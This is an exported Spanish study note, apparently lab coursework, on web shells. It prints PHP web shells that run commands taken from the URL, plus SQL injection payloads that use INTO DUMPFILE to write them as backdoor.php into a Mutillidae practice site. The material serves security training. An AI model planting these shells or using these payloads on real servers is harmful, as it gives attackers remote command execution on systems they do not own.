<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Webshells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Webshells</h1><br/><p></p><p>Una web Shell no es una vulnerabilidad como tal, sino que es un script, un fragmento de código que vamos a inyectar en la máquina que está alojando la aplicación web, de manera que podamos ganar cosas como persistencia en esa máquina, como la ejecución remota de comandos, etc.</p><p></p><p>Un ejemplo de webshell podría ser el siguiente script de php:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#ad7fa8;font-weight:400">&lt;?php</span> <span style="color:#000000;font-weight:700">echo</span> passthru<span style="color:#000000;font-weight:700">(</span><span style="color:#729fcf;font-weight:400">$_GET[</span><span style="color:#edd400;font-weight:400">&#39;cmd&#39;</span><span style="color:#729fcf;font-weight:400">]</span><span style="color:#000000;font-weight:700">);</span><span style="color:#ad7fa8;font-weight:400">?&gt;</span></pre></div></p><p></p><p>Recibe un comando por URL y ejecuta el comando en el sistema operativo.</p><p>Si conseguimos subir el archivo a la web y accedemos desde la URL al archivo, al pasar el parámetro cmd podemos usarlo como una forma de pasar comandos a la maquina del servidor.</p><p></p><p>Para poder subir este archivo vamos a utilizar una vulnerabilidad que se trata de una falta de configuración.</p><p></p><p>Normalmente la base de datos necesita leer o escribir ficheros y esta está limitada a uno o pocos directorios pero a veces esta medida de seguridad se desactiva porque necesitan que acceda a otros directorios por lo que en ese caso tendría acceso a muchos más ficheros dentro de la máquina objetivo.</p><p></p><p>Esta configuración suele estar aquí:</p><p><img src="images/125-1.png" alt="images/125-1.png" /></p><p></p><p>Aprovechando el SQLInjection de:</p><p></p><p><img src="images/125-2.png" alt="images/125-2.png" /></p><p></p><p>Vamos a crear la webShell con el siguiente comando:</p><p></p><p><div class="codebox"><pre><br />&#39; union select null,null,null,null,null,null,&#39;<span style="color:#ad7fa8;font-weight:400">&lt;?php</span> <span style="color:#000000;font-weight:700">echo</span> passthru<span style="color:#000000;font-weight:700">(</span><span style="color:#729fcf;font-weight:400">$_GET[</span><span style="color:#edd400;font-weight:400">&#39;cmd&#39;</span><span style="color:#729fcf;font-weight:400">]</span><span style="color:#000000;font-weight:700">);</span><span style="color:#ad7fa8;font-weight:400">?&gt;</span>&#39; INTO DUMPFILE &#39;../../../../../var/www/html/mutillidae/backdoor.php&#39;</pre></div></p><p></p><p><div class="codebox"><pre><br />&#39; union select null,null,null,null,null,null,&#39;<span style="color:#729fcf;font-weight:400">&lt;html&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;body&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;form</span> <span style="color:#8ae234;font-weight:700">method=</span><span style="color:#edd400;font-weight:400">&quot;GET&quot;</span> <span style="color:#8ae234;font-weight:700">name=</span><span style="color:#edd400;font-weight:400">&quot;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&quot;</span><span style="color:#729fcf;font-weight:400">&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;input</span> <span style="color:#8ae234;font-weight:700">type=</span><span style="color:#edd400;font-weight:400">&quot;TEXT&quot;</span> <span style="color:#8ae234;font-weight:700">name=</span><span style="color:#edd400;font-weight:400">&quot;cmd&quot;</span> <span style="color:#8ae234;font-weight:700">autofocus</span> <span style="color:#8ae234;font-weight:700">id=</span><span style="color:#edd400;font-weight:400">&quot;cmd&quot;</span> <span style="color:#8ae234;font-weight:700">size=</span><span style="color:#edd400;font-weight:400">&quot;80&quot;</span><span style="color:#729fcf;font-weight:400">&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;input</span> <span style="color:#8ae234;font-weight:700">type=</span><span style="color:#edd400;font-weight:400">&quot;SUBMIT&quot;</span> <span style="color:#8ae234;font-weight:700">value=</span><span style="color:#edd400;font-weight:400">&quot;Execute&quot;</span><span style="color:#729fcf;font-weight:400">&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;/form&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;pre&gt;</span><br /><span style="color:#ad7fa8;font-weight:400">&lt;?php</span><br />    <span style="color:#000000;font-weight:700">if(isset(</span><span style="color:#729fcf;font-weight:400">$_GET[</span><span style="color:#edd400;font-weight:400">&#39;cmd&#39;</span><span style="color:#729fcf;font-weight:400">]</span><span style="color:#000000;font-weight:700">))</span><br />    {<br />        system<span style="color:#000000;font-weight:700">(</span><span style="color:#729fcf;font-weight:400">$_GET[</span><span style="color:#edd400;font-weight:400">&#39;cmd&#39;</span><span style="color:#729fcf;font-weight:400">]</span><span style="color:#000000;font-weight:700">);</span><br />    }<br /><span style="color:#ad7fa8;font-weight:400">?&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;/pre&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#729fcf;font-weight:400">&lt;/html&gt;</span>&#39; INTO DUMPFILE &#39;../../../../../var/www/html/mutillidae/backdoor.php&#39;</pre></div></p><p></p><p><img src="images/125-3.png" alt="images/125-3.png" /></p><p></p><p><img src="images/125-4.png" alt="images/125-4.png" /></p><p></p><p><img src="images/125-5.png" alt="images/125-5.png" /></p><p></p><p></p></div>
</body>
</html>
